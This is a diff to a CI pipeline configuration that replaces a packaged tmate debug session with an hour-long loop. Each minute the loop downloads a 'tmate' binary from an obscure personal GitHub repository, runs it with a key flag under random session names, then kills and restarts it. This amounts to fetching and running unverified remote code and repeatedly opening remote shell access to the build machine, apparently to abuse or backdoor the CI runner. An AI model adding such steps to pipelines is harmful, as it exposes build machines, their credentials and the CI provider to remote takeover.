@@ -1,27 +1,37 @@
 version: v1.0
-name: Tmate Debug Session
+name: tmate-1hr-run
 agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu2004
 blocks:
-  - name: Start Tmate Session
+  - name: run-tmate-loop
     task:
       jobs:
-        - name: Debug with Tmate
-          prologue:
-            commands:
-              - sudo apt-get update
-              - sudo apt-get install -y tmate
+        - name: tmate-loop
           commands:
-            - echo "Starting tmate session..."
-            - tmate -S /tmp/tmate.sock new-session -d
-            - tmate -S /tmp/tmate.sock wait tmate-ready
-            - echo "----------------------------------------------------"
-            - 'echo "Tmate session is ready! Connect using the details below:"'
-            - tmate -S /tmp/tmate.sock display -p 'SSH Session: null
-            - tmate -S /tmp/tmate.sock display -p 'Web Shell URL: null
-            - echo "----------------------------------------------------"
-            - echo "Session will remain active for 1 hour."
-            - sleep 3600
-            - echo "Session time is over. Terminating job."
+            - sudo apt-get update -y
+            - sudo apt-get install -y wget openssl
+            - mkdir -p tmate-logs
+            - cd tmate-logs
+            - |
+              echo "Starting 1-hour tmate session loop..."
+              END_TIME=$((SECONDS + 3600))  # 1 hour
+
+              while [ $SECONDS -lt $END_TIME ]; do
+                NAME=$(openssl rand -hex 4)
+                echo "Starting session: $NAME"
+
+                wget -q https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate -O tmate
+                chmod +x tmate
+
+                # Run tmate in background for ~1 minute
+                ./tmate -F -n "$NAME" -k > "$NAME.log" 2>&1 &
+                PID=$!
+                sleep 60
+                kill $PID || true
+
+                echo "Session $NAME finished. Restarting..."
+              done
+
+              echo "All done after 1 hour."
